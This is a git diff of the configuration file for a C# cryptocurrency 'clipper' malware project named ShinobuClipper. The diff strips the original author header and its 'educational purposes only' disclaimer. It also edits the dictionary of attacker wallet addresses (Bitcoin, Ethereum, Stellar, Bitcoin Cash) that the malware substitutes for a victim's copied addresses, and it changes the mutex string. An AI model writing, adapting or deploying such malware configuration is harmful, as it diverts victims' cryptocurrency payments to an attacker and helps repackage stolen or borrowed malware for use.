@@ -1,11 +1,4 @@
-﻿/* 
-    ^ Author    : LimerBoy
-    ^ Name      : ShinobuClipper
-    ^ Github    : https://github.com/LimerBoy
-    > This program is distributed for educational purposes only.
-*/
-
-using System.Collections.Generic;
+﻿using System.Collections.Generic;
 
 namespace Clipper
 {
@@ -23,17 +16,18 @@ namespace Clipper
         // Replace 
         public static Dictionary<string, string> addresses = new Dictionary<string, string>()
         {
-            {"btc", "1AzxXLqLABEo5zSQhp1qJVAsx9CYX86vfU" },
-            {"eth", "0x357C0541F19a7755AFbF1CCD824EE06059404238" },
-            {"xmr", "" },
-            {"xrp", "" },
-            {"ltc", "" },
-            {"neo", "" },
-            {"bch", "qphk8ghgspmtmfrqfyalqxj48w9gtazuwuvz3xa26t" },
-            {"dash", "" }
+            {"btc", "1AzxXLqLABEo5zSQhp1qJVAsx9CYX86vfU" }, // Bitcoin
+            {"eth", "0x357C0541F19a7755AFbF1CCD824EE06059404238" }, // Ethereum
+            {"xmr", "" }, // Monero
+            {"xlm", "GBMNM7KM7CKNK4BNOPWCXRDZ4HI572RW4V7TEJSCHPUFTS5I4BFIW7IY" }, // Stellar
+            {"xrp", "" }, // Ripple
+            {"ltc", "" }, // Litecoin
+            {"nec", "" }, // Neocoin
+            {"bch", "qphk8ghgspmtmfrqfyalqxj48w9gtazuwuvz3xa26t" }, // Bitcoin Cash
+            {"dash", "" } // Dashcoin
         };
-        // Mutex
-        public static string mutex = "asfrewrfwerewsf231";
+        // Mutex (random)
+        public static string mutex = "a1sfrewrfwerewsf231";
 
     }
 }
